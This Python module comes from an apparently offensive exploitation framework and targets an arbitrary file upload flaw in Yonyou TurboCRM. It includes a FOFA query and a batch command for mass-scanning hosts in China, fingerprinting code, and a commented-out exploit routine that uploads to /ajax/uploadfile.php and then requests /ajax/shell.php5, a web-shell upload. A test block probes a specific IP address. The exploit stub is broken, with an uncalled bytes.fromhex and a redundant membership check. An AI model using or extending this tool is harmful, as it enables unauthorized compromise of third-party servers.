# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *

# fofa: "用友" && country="CN"
# python3 batch.py -m exploit.scripts.OA.yonyou.crm.unauth_uploadfile -fs "body=\"/js/turboui.js\"" -cs


class Script(BaseScript):
    name = 'yonyou-turbo-crm'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.UPLOADFILE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/login/login.php']
        # exec
        self.exec_path_list = ['/ajax/uploadfile.php']
        # 相关信息
        self.info = '''用友-TurboCRM 任意文件上传漏洞'''
        # is_run
        self.is_run = 0

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if '/js/turboui.js' in text in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    # async def exec(self):
    #     headers = self.headers.copy()
    #     headers.update({'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryJG8GQwcKBH2u9Y7o'})
    #     async with aiohttp.ClientSession() as session:
    #         for exec_path in self.exec_path_list:
    #             url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
    #             data = bytes.fromhex
    #             await AsyncFetcher.fetch(session=session, url=url, data=data, headers=headers, timeout=self.req_timeout)
    #             url2 = f'http://{self.target}/ajax/shell.php5' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/ajax/shell.php5'
    #             text2 = await AsyncFetcher.fetch(session=session, url=url2, data=data, headers=headers, timeout=self.req_timeout)
    #             print(text2)
                # if 'InstallProperties_en.properties' in text:
                #     gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                #     return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    import requests
    import hashlib

    resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)